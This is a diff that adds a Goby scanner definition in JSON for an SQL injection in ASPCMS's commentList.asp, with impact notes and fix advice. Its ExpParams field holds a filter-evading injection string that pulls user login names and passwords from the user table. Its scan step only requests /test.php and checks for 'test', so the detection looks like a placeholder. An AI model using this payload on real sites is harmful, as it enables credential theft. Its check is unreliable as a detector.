@@ -1,0 +1,74 @@
+{
+  "Name": "ASPCMS commentList.asp SQLi",
+  "Description": "The ASPCMS system is not strict in filtering the data parameters submitted by visitors, so the attacker can submit the constructed SQL statement to query the database at any time to obtain sensitive information.",
+  "Product": "ASPCMS",
+  "Homepage": "http://www.aspcms.com/",
+  "DisclosureDate": "2021-06-16",
+  "Author": "sharecast.net@gmail.com",
+  "GobyQuery": "app=\"ASPCMS\"",
+  "Level": "2",
+  "Impact": "<p>Hackers can execute SQL statements directly, so as to control the whole server: data acquisition, data modification, data deletion, etc.<br></p>",
+  "Recommendation": "<p>1. the data input by users should be strictly filtered in the web code.</p><p>2. deploy web application firewall to monitor database operation.</p><p>3. upgrade to the latest version.</p>",
+  "References": [
+    "https://www.safeinfo.me/2019/07/22/aspcms-lou-dong-ji-he.html"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom {prefix}user"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": [
+    "SQL Injection"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
